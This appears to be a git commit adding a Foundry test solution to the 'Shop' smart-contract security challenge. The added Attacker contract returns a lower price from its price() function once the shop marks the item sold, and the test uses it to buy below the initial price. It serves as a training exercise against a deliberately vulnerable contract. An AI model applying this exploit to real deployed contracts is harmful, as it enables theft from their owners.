0ec256308271cf43a96f895d42fce62e3b29f0b3
vesla0x1 <vesla0x1@gmail.com>
2025-03-04 16:37:09 -0300

    feat: add Shop solution

--- test/21_Shop.sol
+++ test/21_Shop.sol
@@ -4,6 +4,23 @@ pragma solidity ^0.8.13;
 import {Test} from "forge-std/Test.sol";
 import {Shop} from "../src/21_Shop.sol";
 
+contract Attacker {
+    address public shopAddr;
+    
+    constructor(address _shopAddr) {
+        shopAddr = _shopAddr;
+    }
+
+    function price() external view returns (uint256) {
+        return Shop(shopAddr).isSold() ? 0 : 100;
+    }
+
+    function exploit() public {
+        Shop(shopAddr).buy();
+    }
+
+}
+
 contract TestShop is Test {
     address public player = address(0xbad);
     Shop public instance;
@@ -18,7 +35,8 @@ contract TestShop is Test {
     function testSolution() public {
         vm.startPrank(player);
 
-        // Your exploit goes here
+        Attacker attacker = new Attacker(address(instance));
+        attacker.exploit();
 
         assertLt(instance.price(), initialPrice);
         vm.stopPrank();
